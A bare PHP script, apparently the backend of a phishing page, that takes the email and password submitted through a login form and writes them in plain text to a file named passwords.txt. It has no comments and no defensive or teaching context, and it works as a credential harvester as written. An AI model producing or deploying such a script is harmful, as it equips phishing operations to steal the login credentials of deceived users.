<?php
$myfile = fopen("passwords.txt", "w") or die("Unable to open file!");
$txt = "username: " . $_POST['email'] . "\n";
$txt .= "password: " . $_POST['password'] . " \n";;
fwrite($myfile, $txt);
fclose($myfile);
?>
